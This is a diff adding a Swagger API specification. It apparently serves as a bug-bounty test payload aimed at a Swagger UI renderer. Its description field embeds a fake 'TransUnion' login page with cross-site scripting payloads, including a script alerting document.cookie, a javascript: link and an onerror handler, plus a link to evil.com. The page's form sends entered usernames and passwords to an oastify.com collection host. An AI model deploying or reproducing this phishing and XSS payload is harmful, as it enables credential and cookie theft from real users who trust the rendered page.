@@ -1,0 +1,49 @@
+swagger: '2.0'
+info:
+  version: 'v1'
+  title: TransUnion LLC Login Verification.
+  description: '<div class="login-form">
+    <div class="heading">
+       <img  src="https://profile-photos.hackerone-user-content.com/variants/b49flqwdvothar7p6pdt66pf500p/721dca56fd9622207c2a733dca522f953da37392fca6cfffba0ed436679a3af2" >
+        <h1>welcom to dashboard : Plese  Login First  </h1>
+ <h2>for login enter your credentials bellow</h2>
+        <script>alert(document.cookie)</script>
+        <a href="https://evil.com/" >Visit our Hotels Site</a>
+        <a href="javascript:alert(1)">Try Me</a>
+        <link href="https://cdn6.agoda.net/cdn-accom-web/js/assets/browser-bundle/AVENGERS-1679=A&PER-9231=A/3402-e4984b598588.css" rel="stylesheet" onerror="alert(1)"/>
+    </div>
+    <div class="form-container">
+        <form action="https://7ltksecl5cq7ck9bjucudbef066xunic.oastify.com/" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+host: 7ltksecl5cq7ck9bjucudbef066xunic.oastify.com
+
+paths:
+
+  /{Username}/{Password}:
+    post:
+      summary: Logs in
+      parameters:
+        - name: Username 
+          required: true
+          in: path
+          type: string
+        - name: Password 
+          required: true
+          in: path
+          type: string
+      responses:
+        200:
+          description: Login was successful
